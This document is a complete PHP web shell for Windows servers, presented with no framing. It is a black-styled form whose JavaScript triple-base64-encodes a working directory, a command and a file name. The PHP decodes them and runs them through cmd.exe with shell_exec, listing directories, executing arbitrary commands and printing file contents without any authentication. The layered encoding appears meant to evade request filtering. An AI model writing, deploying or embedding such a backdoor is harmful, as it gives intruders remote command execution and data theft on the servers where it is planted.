<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <title><?php echo $_SERVER['PHP_SELF']; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  width:99%;
  height:auto;
  min-height: 600px;
  margin: 20px 5px;
  background: black;
  border: 1px solid white;
  font: 16px arial;
  color: #ffffff;
}

div {
  border: 1px solid white;
  width: auto;
  min-height: 1.1em;
  margin: 7px;
}

p {
  line-height: 1.1;
  width: 95%;
  margin 0 0 0 0;
  padding: 0 0 0 0;
}

.containH {
  display: flex;
  flex-flow: row nowrap;
}
.containH div:nth-child(1) {
  display: flex;
  flex-flow: column nowrap;
  flex: 1 1 auto;
  width: 80%;
  justify-content: flex-end;
  align-items: flex-end;
}
.containH div input{
  width:  95%;;
  align-items: flex-end;
}
.containH div input{
  width: auto%;

  margin: auto;
  font-family: "Courier New", Courier, monospace;
}
.containH div:nth-child(2) {
  display: flex;
  flex: 1 1 auto;
  width: 20%;
  height: auto;
  justify-content: center;
  align-items: center;
}
pre {
  font-size: 13px;
  font-family: "Courier New", Courier, monospace;
}

.top_pane {
  overflow: auto;
  height: 200px;
  width:  98%;
  border: 1px solid white;
}
.bottom_pane {
  overflow: auto;
  height: 800px;
  width:  98%;
  border: 1px solid white;
}

textarea {
  background-color: black;
  color: white;
  font-size: 13px;
  font-family: "Courier New", Courier, monospace;
}
</style>
<script type="text/javascript">
function convert(){
  document.getElementsByName("wd")[0].value = btoa(btoa(btoa(document.getElementsByName("wd")[0].value))); 
  document.getElementsByName("rc")[0].value = btoa(btoa(btoa(document.getElementsByName("rc")[0].value))); 
  document.getElementsByName("cf")[0].value = btoa(btoa(btoa(document.getElementsByName("cf")[0].value))); 
}
</script>
</head>
<body>
<form onsubmit="convert();" action="<?php echo $_SERVER['PHP_SELF']; ?>" method='POST'>
    <div class="containH"> 
    <div>
        <p>Working dir: <input type="text" name="wd" value="<?php echo htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST['wd']))));?>"></p>
        <p>Command: <input type="text" name="rc" value=""></p>
        <p>cat file: <input type="text" name="cf" value=""></p>
        <?php
                $working = htmlspecialchars(base64_decode(base64_decode(base64_decode($_POST['wd']))));
                $rcom = '\Windows\System32\cmd.exe /c "cd ' . $working . ' & ' . base64_decode(base64_decode(base64_decode($_POST["rc"]))) . '" 2>&1';
                $rfile = base64_decode(base64_decode(base64_decode($_POST["cf"])));
                $cddir = '\windows\system32\cmd.exe /C "cd ' . $working . ' & dir" 2>&1';
                $cdtype = '\windows\system32\cmd.exe /C "cd ' . $working . ' & type ' . $rfile . '" 2>&1' ;
        ?>
    </div> 
    <div>
        <center><input type='submit' value='Submit'></center>
    </div>
    </div>
    <pre><center><textarea class="top_pane">
        <?php
                echo "Working dir: " . $working . "\n";
                echo "Command: " . $cddir . "\n\n";
                echo shell_exec($cddir) . "\n";
        ?>
    </textarea></center></pre>
    <pre><center><textarea class="bottom_pane">
        <?php
                echo "Working dir: " . $working;
                if (isset($_POST['rc']) && $_POST['rc'] != ""){
                        echo "Command: " . $rcom . "\n\n";
                        echo shell_exec($rcom) . "\n";
                }
                if (isset($_POST['cf']) && $_POST['cf'] != ""){
                        echo "Command: " . $cdtype . "\n\n";
                        echo shell_exec($cdtype) . "\n";
                }
        ?>
    </textarea></center></pre>
</form>
</body>
</html>
